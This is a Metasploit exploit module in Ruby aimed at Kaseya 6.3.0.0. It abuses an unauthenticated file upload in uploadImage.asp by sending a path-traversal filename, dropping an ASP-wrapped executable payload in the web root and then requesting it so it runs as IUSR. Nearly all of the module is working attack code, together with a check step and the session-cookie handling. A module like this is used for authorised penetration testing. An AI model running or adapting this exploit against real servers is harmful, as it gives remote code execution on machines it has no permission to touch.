##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = ExcellentRanking

        include Msf::Exploit::Remote::HttpClient
        include Msf::Exploit::EXE
        include Msf::Exploit::FileDropper

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Kaseya uploadImage Arbitrary File Upload',
                        'Description'    => %q{
                                        This module exploits an arbitrary file upload vulnerability found in Kaseya 6.3.0.0
                                A malicious user can upload a file to an arbitrary directory without authentication, which can result in arbitrary code execution.
Code executed in this manner runs under the IUSR account.
                        },
                        'Author'         =>
                                [
                                        'Thomas Hibbert' # cartel
                                ],
                        'License'        => MSF_LICENSE,
                        'References'     => [['URL', 'http://security-assessment.com/files/documents/advisory/Kaseya%20File%20Upload.pdf']],
                        'Payload'        => {},
                        'Platform'       => 'win',
                        'Arch'               => ARCH_X86,
                        'Targets'        =>
                                [
                                 [ 'Kaseya KServer / Windows', {} ],
                                ],
                        'DefaultTarget'  => 0,
                        'DisclosureDate' => 'Nov 18 2013'))

                register_options(
                        [
                         Opt::RPORT(80), Opt::RHOST()
                        ], self.class)
        end

        def check
                res = send_request_cgi({
                        'method' => 'POST',
                        'uri'    => normalize_uri('SystemTab','uploadImage.asp')
                })

                if not res or res.code != 200
                        return Exploit::CheckCode::Unknown
                end

                return Exploit::CheckCode::Appears
        end

        def get_cookie
          res = send_request_cgi({
                                   'method' => 'GET',
                                   'uri'    => normalize_uri("SystemTab", "uploadImage.asp")
                                 })

          if res and res.headers['Set-Cookie']
            cookie = res.headers['Set-Cookie'].scan(/(\w+\=\w+); path\=.+$/).flatten[0]
          else
            fail_with(Failure::Unknown, "#{@peer} - No cookie found, will not continue")
          end

          cookie
        end

        def exploit
          peer = "#{rhost}:#{rport}"

          @payload_name = "#{rand_text_alpha_lower(8)}.asp"
          exe  = generate_payload_exe
          asp  = Msf::Util::EXE.to_exe_asp(exe)

          post_data = Rex::MIME::Message.new
          post_data.add_part(asp, "application/octet-stream", nil, "form-data; name=\"uploadFile\"; filename=\"..\\#{@payload_name}\"")


          data = post_data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

          cookie = get_cookie
          res = send_request_raw({
                                   'method' => 'POST',
                                   'uri'    => normalize_uri('SystemTab','uploadImage.asp?filename=..\..\..\..\\'+@payload_name),
                                   'data'   => data,
                                   'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
                                   'cookie' => cookie
                                 })

          register_files_for_cleanup(@payload_name)

          if not res or res.code != 200
            fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Upload failed")
          end

          print_status("#{peer} - Executing payload #{@payload_name}")
          res = send_request_cgi({
                                   'uri'    => normalize_uri(@payload_name),
                                   'method' => 'GET'
                                 })
        end
      end
